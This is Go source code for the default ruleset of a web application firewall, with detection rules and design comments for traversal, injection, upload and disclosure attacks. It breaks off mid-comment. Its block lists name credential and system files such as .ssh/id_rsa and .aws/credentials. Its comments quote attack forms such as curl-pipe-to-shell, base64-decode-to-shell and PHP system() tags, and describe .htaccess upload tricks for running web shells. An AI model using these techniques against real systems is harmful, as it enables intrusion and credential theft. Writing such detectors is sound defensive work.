// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

// Package core provides the first-party ruleset loaded by gwaf.New.
//
// Every rule here is Certain or High confidence. That constraint is what makes
// blocking by default defensible: a WAF that ships in detection-only mode
// protects nothing while telling the operator they are covered, and a WAF that
// blocks on imprecise rules gets disabled within a week. The way out is not a
// safer default mode, it is a ruleset precise enough to enforce.
//
// Rules that need tuning belong in an optional bundle, not here.
//
// Confidence is a measured property, not an authored one: `gwaf calibrate`
// checks each rule's false-positive rate against the benign corpus and fails
// the build when it exceeds the declared tier's ceiling. See docs/CONCEPT.md §8.
package core

import (
	"github.com/gsoultan/gwaf/detect/graphql"
	"github.com/gsoultan/gwaf/detect/ldapi"
	"github.com/gsoultan/gwaf/detect/nosqli"
	"github.com/gsoultan/gwaf/detect/promptinjection"
	"github.com/gsoultan/gwaf/detect/shelli"
	"github.com/gsoultan/gwaf/detect/sqli"
	"github.com/gsoultan/gwaf/detect/ssti"
	"github.com/gsoultan/gwaf/detect/xss"
	"github.com/gsoultan/gwaf/rules"
	"github.com/gsoultan/gwaf/rules/op"
	"github.com/gsoultan/gwaf/rules/op/rx"
	"github.com/gsoultan/gwaf/rules/transform"
	"github.com/gsoultan/gwaf/types"
)

// ID allocation within the core range (1..99,999):
//
//	1,000–1,999  path traversal
//	2,000–2,999  SQL injection
//	3,000–3,999  cross-site scripting
//	4,000–4,999  command injection and local file inclusion
//	5,000–5,999  scanners and known-hostile clients
//	6,000–6,999  response-side disclosure
//	7,000–7,999  NoSQL injection
//	8,000–8,999  server-side template injection
//	9,000–9,999  LDAP injection
//	10,000–10,999 GraphQL abuse
//	11,000–11,999 server-side request forgery
//	12,000–12,999 prototype pollution
//	13,000–13,999 AI/LLM prompt injection and system-prompt leakage
//
// An authored ID must end below 100 within its band, because the generated
// body-phase counterpart is the ID plus 900 (see bodyPhaseOffset) and has to
// land in the same band. 2,501 would mirror to 3,401 — an ID an operator would
// reasonably look up as cross-site scripting. TestMirrorIDsStayInBand enforces
// this; it is not a convention anyone has to remember.
const (
	IDTraversalEncoded  types.RuleID = 1001
	IDTraversalRaw      types.RuleID = 1002
	IDSensitiveFile     types.RuleID = 1003
	IDNullByteInjection types.RuleID = 1005
	IDTraversalRepeated types.RuleID = 1004
	IDExposedArtifact   types.RuleID = 1006
	IDBackupArtifact    types.RuleID = 1008

	// 1007 is CRLFHeaderRule and is deliberately NOT here. It is the only rule
	// needing a transform chain that keeps line breaks, and a chain nobody else
	// shares is materialised over every value of every request: benign POST JSON
	// measured 15.4us with it and 14.2us without, against a 15us SLO. One rule
	// cannot spend 8% of the latency budget on requests it cannot match.
	//
	//	gwaf.New(gwaf.WithRuleset(rules.Set{core.CRLFHeaderRule(1007)}))
	IDConfigTraversal types.RuleID = 1009
	IDScriptInUpload  types.RuleID = 1010
	// 2001-2004 were literal SQL injection rules: tautology, UNION SELECT,
	// comment sequences, and stacked statements. All four are superseded by
	// IDSQLiSemantic, which recognises the same constructs by grammar and
	// therefore also covers the variants a literal list has to enumerate.
	//
	// They were removed rather than kept alongside it because 2002 was an
	// active false positive: "the union selected a new representative"
	// collapses to "unionselected" once whitespace is stripped, which contains
	// "unionselect". The structural detector does not match it, because the
	// two keywords are not adjacent in the grammar.
	//
	// The IDs are retired, not reused. They appear in audit logs and any
	// exception someone already wrote, and silently rebinding them to different
	// behaviour would invalidate both.
	// 3001-3003 were literal XSS rules: script tags, event-handler attributes,
	// and script URI schemes. All three are superseded by IDXSSSemantic, which
	// recognises the same structures *in position* — an "onerror" inside a tag
	// rather than anywhere in the value — and therefore also covers the
	// variants a literal list cannot, such as "<svg/onload=" and
	// "java\tscript:".
	//
	// Retired, not reused: the IDs appear in audit logs and in any exception
	// already written against them.
	// 4001 and 4002 were literal command injection rules: a list of command
	// names glued to separators, and a list of shell binary paths. Both are
	// superseded by IDShelliSemantic, which reads shell *structure* -- a name
	// in command position, after unquoting -- and therefore also covers the
	// forms no literal list can reach.
	//
	// Four payloads walked through them, each a technique in use for years:
	// glob obfuscation (/???/c?t), encode-and-pipe (echo …|base64 -d|sh),
	// fetch-and-pipe (curl …|sh), and substring expansion (${PATH:0:1}). None
	// contains the literal it would have to match.
	//
	// 4001 was also an active false positive: "`id`" was a literal, and that
	// is how everyone writes inline code in Markdown, so "use the `id` field"
	// was blocked. The structural detector does not report a bare backtick
	// substitution, for exactly that reason.
	//
	// Retired, not reused: the IDs appear in audit logs and in any exception
	// already written against them.
	IDLFIPHPWrapper       types.RuleID = 4003
	IDPHPCodeUpload       types.RuleID = 4004
	IDXMLEntity           types.RuleID = 4005
	IDLog4ShellLookup     types.RuleID = 4006
	IDPHPObjectInjection  types.RuleID = 4007
	IDJavaDeserialization types.RuleID = 4008
	IDSpring4Shell        types.RuleID = 4009
	IDShelliSemantic      types.RuleID = 4010
	IDExpressionLanguage  types.RuleID = 4011
	IDJavaGadgetClass     types.RuleID = 4012
	IDPHPDynamicEval      types.RuleID = 4013
	IDRemoteFileInclusion types.RuleID = 4014
	IDServerConfigUpload  types.RuleID = 4015
	IDPHPPregReplaceEval  types.RuleID = 4016
	IDSQLiSemantic        types.RuleID = 2010
	IDXSSSemantic         types.RuleID = 3010
	IDScannerUserAgent    types.RuleID = 5001

	// 6,000-6,999: response-phase leak detection.
	IDLeakPrivateKey types.RuleID = 6001
	IDLeakStackTrace types.RuleID = 6002
	IDLeakSQLError   types.RuleID = 6003

	// 7,000-7,999: NoSQL injection.
	IDNoSQLiEval     types.RuleID = 7001
	IDNoSQLiOperator types.RuleID = 7002

	// 8,000-8,999: server-side template injection.
	IDSSTIExpression types.RuleID = 8001

	// 9,000-9,999: LDAP injection.
	IDLDAPiFilter types.RuleID = 9001

	// 10,000-10,999: GraphQL abuse. Not injection -- the document is valid and
	// the damage is done by its shape.
	IDGraphQLStructure types.RuleID = 10001

	// 11,000-11,999: server-side request forgery. In scope because it is
	// decidable from one request with no memory: the target is a literal in the
	// value. Detection is deliberately *lexical only* -- gwaf never resolves a
	// hostname, because a DNS lookup is a network call and the third ownership
	// test puts that with the embedder (boundaries.md). That also means
	// DNS-rebinding is explicitly not covered here; it cannot be.
	IDSSRFMetadata types.RuleID = 11001
	IDSSRFScheme   types.RuleID = 11002

	// 11003 is LoopbackSSRFRule and is deliberately NOT here, for the same
	// reason as GraphQL introspection below: "localhost" and "127.0.0.1" are
	// ordinary values in CI, staging, and developer traffic, so blocking them by
	// default is the rule that gets the WAF switched off. Opt in:
	//
	//	gwaf.New(gwaf.WithRuleset(rules.Set{core.LoopbackSSRFRule(11003)}))

	// 12,000-12,999: JavaScript prototype pollution.
	IDPrototypePollution types.RuleID = 12001

	// 13,000-13,999: AI/LLM. In scope because it is decidable from one request
	// with no memory -- the payload is text in the body and the question "does
	// this try to override the model's instructions?" is answered by the text.
	// No model, no network call, no state (CLAUDE.md §1).
	IDPromptInjection  types.RuleID = 13001
	IDSystemPromptLeak types.RuleID = 13002

	// 10002 is graphql.IntrospectionRule and is deliberately NOT here.
	//
	// Introspection is how every GraphQL development tool works. Disabling it in
	// production is a defensible posture and blocking it by default would break
	// GraphiQL, Apollo Studio, and code generation on the day somebody adopted
	// gwaf -- which is the "gets switched off within a week" failure this
	// ruleset exists to avoid. A rule that needs tuning belongs in an optional
	// bundle (CLAUDE.md §1), so an embedder opts in:
	//
	//	gwaf.New(gwaf.WithRuleset(rules.Set{graphql.IntrospectionRule(10002)}))
)

// argTargets are the request values an injection rule inspects. Header values
// are included because injection through headers is routine and a rule that
// only inspected arguments would miss it.
var argTargets = []types.Target{
	{Kind: types.TargetArgs},
	// Parameter *names* are as attacker-controlled as their values, and a
	// payload placed in one would otherwise be invisible: nothing else inspects
	// them. This matters most for JSON object keys, which the body parser emits
	// here.
	{Kind: types.TargetArgNames},
	{Kind: types.TargetRequestURI},
	{Kind: types.TargetRequestHeaders},
}

// shellTargets are what a command-injection rule may read.
//
// REQUEST_URI is deliberately absent, and leaving it in was a category error
// that calibration measured at a 20% false-positive rate. A query string uses
// '&' as *its own* separator, so "?q=x&sort=price" reads as a command boundary
// followed by "sort" -- and sort, head, find, id, env, host, last, less, more,
// and w are all ordinary parameter names as well as commands. Every faceted
// search on the corpus was blocked.
//
// Individual argument values are what an application interpolates into a shell;
// the raw URI is a different language that merely shares punctuation.
var shellTargets = []types.Target{
	{Kind: types.TargetArgs},
	{Kind: types.TargetArgNames},
	{Kind: types.TargetRequestHeaders},
}

// graphqlTargets are the arguments that carry a GraphQL document.
//
// Scoped by name rather than left to a literal, because the only byte every
// abusive document must contain is "{" -- which is in every JSON body ever
// sent. The target check runs before the operator, so a rule scoped this way
// costs nothing on traffic that is not GraphQL.
//
// "query" is the field name in the GraphQL-over-HTTP specification, for both
// the POST body and the GET query string, so one name covers both.
var graphqlTargets = []types.Target{
	{Kind: types.TargetArgs, Name: "query"},
}

// nameTargets are parameter *names* alone.
//
// Scoped this narrowly on purpose: an operator token in a name is an injected
// query operator, while the same bytes in a value are somebody typing about
// MongoDB. Reading values here produced exactly that false positive against
// {"note":"use $ne to negate"}.
var nameTargets = []types.Target{
	{Kind: types.TargetArgNames},
}

// bodyTargets extend argTargets to the parsed body, for phase-2 rules.
var bodyTargets = []types.Target{
	{Kind: types.TargetArgs},
	{Kind: types.TargetArgNames},
	{Kind: types.TargetRequestBody},
}

// responseTargets are what a leak rule inspects. Header values matter as much
// as the body: a framework version or an internal hostname leaks just as
// effectively from a header.
// responseTargets is what a leak rule inspects at the response-headers phase.
// The body-phase counterpart is generated; see withResponsePhase.
var responseTargets = []types.Target{
	{Kind: types.TargetResponseHeaders},
}

// responseBodyTargets extends a leak rule to the body once it is available.
var responseBodyTargets = []types.Target{
	{Kind: types.TargetResponseHeaders},
	{Kind: types.TargetResponseBody},
}

// decodeChain is the normalization applied before injection matching. Order
// matters: percent-decode first so that encoded payloads are seen, then fold
// case, then strip whitespace inserted to break up keywords.
var decodeChain = []rules.Transform{
	transform.URLDecode,
	transform.Lowercase,
	transform.RemoveWhitespace,
}

// pathChain normalizes a path before traversal matching.
var pathChain = []rules.Transform{
	transform.URLDecode,
	transform.Lowercase,
	transform.NormalizePath,
}

// Default is the ruleset gwaf.New loads when the embedder supplies none.
//
// It is the request-phase rules plus a generated request-body counterpart for
// every rule that inspects attacker-supplied content, so a payload blocked in a
// query string is blocked identically in a JSON or form body.
func Default() rules.Set {
	return withResponsePhase(withBodyPhase(requestRules()))
}

// requestRules returns the rules authored for the request-headers phase.
func requestRules() rules.Set {
	return rules.Set{
		// ---- Path traversal -------------------------------------------------
		{
			ID:    IDTraversalEncoded,
			Phase: types.PhaseRequestHeaders,
			Targets: []types.Target{
				{Kind: types.TargetRequestURI},
				{Kind: types.TargetArgs},
			},
			// Matched before normalization: an encoded traversal sequence in a
			// URI has no legitimate use, whereas the decoded form does appear
			// in ordinary relative links.
			Transforms: []rules.Transform{transform.Lowercase},
			// Only the forms where the *dots* are encoded.
			//
			// "..%2f" and "..%5c" were here and were removed: they are what a
			// correct URL encoder produces for a value containing "../". A text
			// field holding "see ../shared/q3.pdf" is encoded by curl, by every
			// browser form, and by every JS client as "..%2Fshared", so matching
			// it made ordinary prose a critical block — found by a pentest benign
			// control, and invisible to the corpus because the corpus carried
			// that text in a JSON body rather than a query value.
			//
			// "%2e%2e%2f" stays, and the distinction is the whole point: no
			// encoder escapes a literal "." in a value, so encoded dots are not
			// transport, they are somebody hiding a traversal from a matcher.
			// The decoded form is still covered by the traversal and
			// sensitive-file rules reading ARGS.
			Op:         op.ContainsAny("%2e%2e%2f", "%2e%2e/", "%2e%2e%5c", "%2e%2e\\"),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Encoded path traversal sequence",
			Tags:       []string{"traversal", "owasp-a01"},
		},
		{
			ID:         IDTraversalRaw,
			Phase:      types.PhaseRequestHeaders,
			Targets:    []types.Target{{Kind: types.TargetRequestPath}},
			Transforms: pathChain,
			// After normalization a leading ".." means the path resolved above
			// its root, which a legitimate request target never does.
			Op:         op.HasPrefix(".."),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Path traversal above document root",
			Tags:       []string{"traversal", "owasp-a01"},
		},
		{
			ID:         IDSensitiveFile,
			Phase:      types.PhaseRequestHeaders,
			Targets:    []types.Target{{Kind: types.TargetRequestURI}, {Kind: types.TargetArgs}},
			Transforms: pathChain,
			Op: op.ContainsAny(
				"/etc/passwd", "/etc/shadow", "/proc/self/environ",
				"/windows/system32/config", ".ssh/id_rsa", ".aws/credentials",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Access to sensitive system file",
			Tags:       []string{"lfi", "owasp-a01"},
		},
		{
			ID:         IDTraversalRepeated,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// A single "../" appears in legitimate relative references, but a
			// repeated segment does not: nothing a browser or client library
			// emits walks two levels up inside one parameter. Whitespace is
			// stripped by the chain, so padded variants are covered too.
			Op:         op.ContainsAny("../..", `..\..`, "..%2f..", `..%5c..`),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Repeated path traversal segment",
			Tags:       []string{"traversal", "owasp-a01"},
		},
		{
			ID:      IDNullByteInjection,
			Phase:   types.PhaseRequestHeaders,
			Targets: argTargets,
			// Matched *before* percent-decoding, on purpose. Decoded, a NUL is
			// indistinguishable from the NULs that fill ordinary binary upload
			// content; encoded, it is a deliberate act with no legitimate use.
			// No client, library, or browser emits "%00" in a parameter.
			//
			// This is the double-extension vector: "shell.php%00.jpg" passes a
			// suffix check that sees .jpg, and a C-backed handler truncates at
			// the NUL and saves shell.php. The payload is the disagreement
			// between the two readings, so the NUL itself is what to detect --
			// not the extension, which is legitimate on its own.
			Transforms: []rules.Transform{transform.Lowercase},
			Op:         op.ContainsAny("%00", "%u0000", "\\x00"),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Encoded null byte in input",
			Tags:       []string{"traversal", "lfi", "owasp-a01"},
		},

		// ---- SQL injection --------------------------------------------------
		{
			ID:      IDSQLiSemantic,
			Phase:   types.PhaseRequestHeaders,
			Targets: argTargets,
			// Only percent-decoding and case folding: the tokenizer needs the
			// original whitespace and punctuation, because that structure is
			// exactly what it reads. Stripping whitespace here would destroy
			// the grammar the detector exists to see.
			Transforms: []rules.Transform{transform.URLDecode},
			// Structural detection rather than string matching. One rule covers
			// the whole variant family -- comment splitting, case alternation,
			// alternative operators, quote-context breaking -- that a signature
			// list has to enumerate one payload at a time. See detect/sqli.
			Op:         sqli.Operator(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "SQL injection (structural)",
			Tags:       []string{"sqli", "owasp-a03", "semantic"},
		},

		// ---- NoSQL injection ------------------------------------------------
		//
		// Two rules rather than one, because the evidence is not equally
		// certain and a rule carries a single confidence.
		//
		// Both read parameter *names*. That is the whole attack: in
		// {"password":{"$ne":null}} nothing dangerous appears in any value, so
		// a value-scanning detector finds nothing at all. See detect/nosqli.
		{
			ID:      IDNoSQLiEval,
			Phase:   types.PhaseRequestHeaders,
			Targets: nameTargets,
			// Percent-decoding only, and no case folding: MongoDB rejects
			// "$NE", so folding would widen the rule onto strings the database
			// would never honour.
			Transforms: []rules.Transform{transform.URLDecode},
			Op:         nosqli.Operator(nosqli.SignalEvalOperator),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "NoSQL injection: database code execution operator",
			Tags:       []string{"nosqli", "rce", "owasp-a03", "semantic"},
		},
		{
			ID:         IDNoSQLiOperator,
			Phase:      types.PhaseRequestHeaders,
			Targets:    nameTargets,
			Transforms: []rules.Transform{transform.URLDecode},
			Op: nosqli.Operator(nosqli.SignalQueryOperator |
				nosqli.SignalUpdateOperator | nosqli.SignalAmbiguousOperator),
			Actions:  []rules.Action{rules.Block},
			Severity: types.SeverityCritical,
			// High rather than Certain: a few frameworks expose MongoDB
			// operators as their published filter DSL, so "?price[$gt]=100" is
			// a documented feature somewhere. Such an application is a NoSQL
			// injection surface by design and reporting it is right — but that
			// is not the same as being certain it is an attack.
			Confidence: types.High,
			Msg:        "NoSQL injection: query operator in parameter name",
			Tags:       []string{"nosqli", "owasp-a03", "semantic"},
		},

		// ---- GraphQL abuse ---------------------------------------------------
		//
		// A different shape of attack from everything else here: the document is
		// valid, the field names are real, and the cost is in its structure. All
		// of it is computed from one request in isolation, which is why it sits
		// inside the scope line rather than outside it with rate limiting.
		{
			ID:      IDGraphQLStructure,
			Phase:   types.PhaseRequestBody,
			Targets: graphqlTargets,
			// Percent-decoding only. The GraphQL-over-HTTP specification defines
			// a GET form where the whole document rides in the query string, so
			// without this an encoded "%7B__schema%7D" is read as one long
			// identifier and every structural count comes back zero -- measured.
			//
			// Nothing else: folding case or stripping whitespace would destroy
			// the grammar the detector counts, which is the opposite problem.
			Transforms: []rules.Transform{transform.URLDecode},
			Op: graphql.Operator(graphql.Limits{},
				graphql.SignalExcessiveDepth|graphql.SignalExcessiveComplexity|
					graphql.SignalAliasAmplification|graphql.SignalFragmentCycle),
			Actions:  []rules.Action{rules.Block},
			Severity: types.SeverityCritical,
			// High rather than Certain: the limits are policy. A content model
			// that is genuinely fifteen levels deep exists, and the operator who
			// has one should raise the limit knowingly rather than discover it
			// as an outage.
			Confidence: types.High,
			Msg:        "GraphQL document exceeds its structural limits",
			Tags:       []string{"graphql", "dos", "owasp-a04"},
		},
		// ---- LDAP injection --------------------------------------------------
		{
			ID:      IDLDAPiFilter,
			Phase:   types.PhaseRequestHeaders,
			Targets: argTargets,
			// Percent-decoding only. The detector counts parentheses and reads
			// what follows them, so stripping whitespace or folding case would
			// leave the structure intact but is pointless work -- and the
			// filter grammar is case-insensitive in exactly the places this
			// does not look at.
			Transforms: []rules.Transform{transform.URLDecode},
			Op:         ldapi.Operator(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "LDAP injection (structural)",
			Tags:       []string{"ldapi", "owasp-a03", "semantic"},
		},

		// ---- Server-side template injection ---------------------------------
		{
			ID:      IDSSTIExpression,
			Phase:   types.PhaseRequestHeaders,
			Targets: argTargets,
			// Percent-decoding only. The detector reads what sits inside a
			// template expression, so the delimiters, dots, and parentheses it
			// keys on must survive: folding case or stripping whitespace would
			// destroy the very structure being read.
			Transforms: []rules.Transform{transform.URLDecode},
			Op:         ssti.Operator(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			// High, not Certain, and the reason is worth stating plainly: an
			// application whose users legitimately author Jinja or Liquid
			// templates will send "{{ config.x }}" on purpose. That application
			// needs a scoped exception. Reporting the finding is right;
			// claiming certainty about it would not be.
			Confidence: types.High,
			Msg:        "Server-side template injection",
			Tags:       []string{"ssti", "rce", "owasp-a03", "semantic"},
		},

		// ---- Cross-site scripting -------------------------------------------
		{
			ID:      IDXSSSemantic,
			Phase:   types.PhaseRequestHeaders,
			Targets: argTargets,
			// Percent-decoding only. The detector reads markup structure, so
			// stripping whitespace or folding case here would destroy the very
			// positions it depends on: "onerror" adjacent to "=" inside a tag
			// is a handler, and the same bytes elsewhere are a word.
			Transforms: []rules.Transform{transform.URLDecode},
			Op:         xss.Operator(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Cross-site scripting (structural)",
			Tags:       []string{"xss", "owasp-a03", "semantic"},
		},

		// ---- Command injection and inclusion --------------------------------
		{
			ID:      IDShelliSemantic,
			Phase:   types.PhaseRequestHeaders,
			Targets: shellTargets,
			// Percent-decoding only. The detector reads separators, quoting,
			// and expansion structure, so stripping whitespace or folding case
			// would destroy the positions it depends on: "cat" after a ';' is a
			// command, and the same three bytes elsewhere are a word.
			Transforms: []rules.Transform{transform.URLDecode},
			Op:         shelli.Operator(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			// High rather than Certain, and calibration is what decided it.
			// CI/CD and automation platforms carry shell commands as *data* --
			// a pipeline API receives "cat VERSION | tr -d" in a `run` field
			// because running it is the product -- and gwaf cannot tell that
			// from injection using one request. Those applications need a
			// scoped exception on the field that carries commands; reporting
			// the finding is right, and certainty about it is not available.
			Confidence: types.High,
			Msg:        "Command injection (structural)",
			Tags:       []string{"rce", "shelli", "owasp-a03", "semantic"},
		},
		{
			ID:         IDLFIPHPWrapper,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// The scheme, not an enumeration of the wrappers behind it.
			//
			// This rule used to list "php://input" and "php://filter" and stop
			// there, which is the failure mode CLAUDE.md §2 warns about: an
			// enumeration is only ever as complete as the day it was written.
			// An attack simulation walked "phar://", "zip://", "glob://", and
			// "php://memory" straight through it. "phar://" is the worst of
			// them -- reaching a phar archive deserializes its metadata, so it
			// is remote code execution wearing the costume of a file read.
			//
			// Matching "php://" covers input, filter, memory, temp, fd, stdin,
			// and whatever PHP adds next, and it is *shorter* than the list it
			// replaces. A wrapper scheme in a request value has no benign
			// reading: these name a stream to the interpreter, not a resource a
			// client can legitimately ask for.
			Op: op.ContainsAny(
				"php://", "phar://", "zip://", "glob://",
				"expect://", "data://text", "compress.zlib://",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "PHP stream wrapper in input",
			Tags:       []string{"lfi", "rce", "owasp-a03"},
		},
		{
			ID:         IDPHPCodeUpload,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// A PHP open tag in a request value is code being delivered, not
			// data. This is the web-shell upload: the file is base64-encoded
			// inside a JSON field, decoded by the origin, written to disk, and
			// then requested.
			//
			// The tag alone is High rather than Certain because a narrow class
			// of applications legitimately carries PHP source in a request: a
			// code-sharing site, a CMS template editor, a paste bin. Those
			// deployments should scope an exception to the field that carries
			// it rather than lower the tier globally.
			//
			// "<?=" is the whole short echo tag, not "<?=$". It opens code in
			// every PHP since 5.4, and requiring the "$" meant "<?=system('id')?>"
			// and "<?=`id`?>" -- which echo a call rather than a variable --
			// walked through. It is not ambiguous with XML either: "<?" starts a
			// processing instruction whose target must be a Name, and "=" cannot
			// start one.
			Op:         op.ContainsAny("<?php", "<?=", "<%php"),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.High,
			Msg:        "PHP code in request value",
			Tags:       []string{"rce", "upload", "owasp-a03"},
		},
		{
			ID:      IDScriptInUpload,
			Phase:   types.PhaseRequestHeaders,
			Targets: []types.Target{{Kind: types.TargetRequestURI}},
			// The path as the origin will resolve it, so "/uploads/x.php%00.jpg"
			// and "/uploads/./x.php" both arrive in the form that decides
			// whether the interpreter runs.
			Transforms: pathChain,
			// A script being *executed* out of a directory that exists to hold
			// uploads.
			//
			// This is the second half of the file-upload attack and the half
			// that still matters after the first has failed. Blocking the
			// upload depends on gwaf seeing it; a file that arrived before gwaf
			// was deployed, through a plugin it does not sit in front of, over
			// FTP, or with stolen credentials, is already on disk. Requesting
			// it is the step that turns a file into code, and that request is
			// one gwaf can always see.
			//
			// The claim is narrow on purpose. It is not "a PHP file", which
			// would block WordPress itself -- every plugin is PHP under
			// wp-content/plugins and some are reached directly. It is a script
			// under a directory whose entire purpose is user-supplied content,
			// where execution is never intended and every hardening guide for
			// twenty years has said to switch it off. An application serving
			// PHP out of its own upload directory is describing a compromise,
			// not a feature.
			Op:         scriptInUploadPath(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Script execution inside an upload directory",
			Tags:       []string{"rce", "webshell", "upload", "owasp-a01"},
		},
		{
			ID:         IDServerConfigUpload,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// Apache configuration directives in a request value.
			//
			// This is the answer to an upload filter that blocks ".php": rather
			// than smuggling a script past the extension check, upload a
			// ".htaccess" that tells the server to run ".jpg" files as PHP, then
			// upload the shell as an image. Both files are individually
			// permitted and together they are remote code execution.
			//
			// The directives are matched, not the filename, because the filename
			// is the part an upload handler may rewrite and the content is the
			// part that has to survive intact to work.
			//
			// "scriptprocessor=" is the IIS form of the same attack: a web.config
			// uploaded beside the payload maps an innocuous extension to an
			// interpreter binary, which is what "AddType ... x-httpd-php" does on
			// Apache. It names the interpreter explicitly, so it is as specific
			// as the Apache directives and no more FP-prone.
			//
			// The legacy <httpHandlers> form is deliberately not matched: what
			// makes it dangerous is the *pairing* of a wildcard path with a
			// handler type, which a literal cannot express, and the element
			// alone appears in ordinary .NET configuration.
			Op: op.ContainsAny(
				"addtypeapplication/x-httpd-php", "sethandlerapplication/x-httpd-php",
				"addhandlerphp", "addhandlerapplication/x-httpd-php",
				"php_flag", "php_value", "addtypeapplication/x-httpd-cgi",
				"options+execcgi", "sethandlercgi-script",
				"scriptprocessor=",
			),
			Actions:  []rules.Action{rules.Block},
			Severity: types.SeverityCritical,
			// High, not Certain: a hosting control panel manages .htaccess for
			// its customers, so these directives are its payload rather than an
			// attack on it. That is a narrow class and it should scope an
			// exception to the field that carries the file, the same answer
			// detect/shelli gives a CI platform.
			Confidence: types.High,
			Msg:        "Server configuration directive in an uploaded value",
			Tags:       []string{"rce", "upload", "htaccess", "owasp-a03"},
		},
		{
			ID:      IDExposedArtifact,
			Phase:   types.PhaseRequestHeaders,
			Targets: []types.Target{{Kind: types.TargetRequestURI}},
			// Path only, deliberately. "Keep wp-config.php outside the web root"
			// is a sensible thing to write in a code review comment, and a rule
			// that read argument values would block the sentence along with the
			// request. What matters is that the *path being fetched* names one
			// of these, not that the string appeared somewhere.
			Transforms: pathChain,
			// Files that exist on the server by accident and disclose it when
			// fetched: version-control metadata, environment files, editor and
			// deployment leftovers, and the status handlers that ship enabled.
			//
			// None of these is an injection. They are the reconnaissance step
			// that precedes one, and they are worth blocking because a request
			// for /.git/config is never a user doing anything.
			Op: op.ContainsAny(
				"/.git/", "/.svn/", "/.hg/", "/.bzr/",
				"/.env", "/.htpasswd", "/.htaccess", "/web.config",
				"/.npmrc", "/.dockercfg", "/.docker/config.json",
				"/wp-config.php", "/configuration.php", "/.ds_store",
				"/server-status", "/server-info", "/debug/pprof", "/debug/vars",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityError,
			Confidence: types.Certain,
			Msg:        "Request for an exposed configuration or metadata artifact",
			Tags:       []string{"disclosure", "recon", "owasp-a05"},
		},
		{
			ID:         IDBackupArtifact,
			Phase:      types.PhaseRequestHeaders,
			Targets:    []types.Target{{Kind: types.TargetRequestURI}},
			Transforms: pathChain,
			// Editor, backup, and dump leftovers, split from the rule above
			// because they are a *weaker claim*. Nobody serves "/.git/config" on
			// purpose, but "report-2026.sql" and "notes.bak" are ordinary
			// filenames inside a file-storage product, a database tool, or a
			// backup service, and those applications would be broken by a rule
			// that ships at Certain.
			//
			// The corpus showed zero matches for both groups until a storage
			// archetype was added to it; this rule then matched 6 of 10,430
			// benign requests (0.058%), and the other one still matches none.
			// That is the tier difference, measured rather than asserted.
			//
			// A file-storage or backup product should scope an exception to the
			// route that serves user filenames -- the same answer detect/shelli
			// gives a CI platform that carries shell commands as data. Reporting
			// the finding is right; certainty about it is not available.
			Op: op.ContainsAny(
				".sql", ".sql.gz", ".bak", ".swp", ".swo",
				".old", ".orig", ".save", ".backup", ".dump",
			),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityWarning,
			Confidence: types.High,
			Msg:        "Request for a backup or editor leftover file",
			Tags:       []string{"disclosure", "recon", "owasp-a05"},
		},
		{
			ID:      IDConfigTraversal,
			Phase:   types.PhaseRequestHeaders,
			Targets: argTargets,
			// decodeChain, not pathChain, and the reason is latency rather than
			// taste. pathChain existed only on the request URI; applying it to
			// arguments as well adds a (chain x target) combination, so every
			// body field is materialised a second time through NormalizePath.
			// That alone moved benign POST JSON from 13.4us to 16.5us and broke
			// the 15us SLO, which the latency gate caught.
			//
			// Nothing is lost: the payload has no whitespace to compress, and
			// NormalizePath would collapse the "../" this rule is looking for.
			Transforms: decodeChain,
			// A relative traversal that ends at an application config file.
			//
			// Neither half is enough alone, and that is the whole design. A
			// single "../" is ordinary -- "../shared/2026/q3-summary.pdf" is a
			// real relative path and the benign corpus contains ones like it --
			// so traversal depth is not the signal. The filename alone is not
			// either: "keep wp-config.php outside the web root" is a sensible
			// code-review comment, and a rule matching the name would block the
			// sentence.
			//
			// Together they are unambiguous. Nobody writes "../wp-config.php"
			// into a parameter except to read the database credentials out of
			// it, which is what made the TimThumb and Slider Revolution bugs
			// mass compromises rather than curiosities.
			Op:         configFileTraversal(),
			Actions:    []rules.Action{rules.Block},
			Severity:   types.SeverityCritical,
			Confidence: types.Certain,
			Msg:        "Traversal to an application configuration file",
			Tags:       []string{"lfi", "disclosure", "owasp-a01"},
		},
		{
			ID:         IDExpressionLanguage,
			Phase:      types.PhaseRequestHeaders,
			Targets:    argTargets,
			Transforms: decodeChain,
			// OGNL, SpEL, and MVEL reaching the JVM. The template-injection
			// detector already knows this vocabulary, but it only reads it
			// *inside template delimiters*, and the expression languages that
			// matter here arrive without any: Struts evaluates OGNL out of a
			// Content-Type header (CVE-2017-5638) and Spring Cloud Function
			// evaluates SpEL out of a routing expression (CVE-2022-22963).
			//
			// A class-literal reference to the Java runtime in a request value
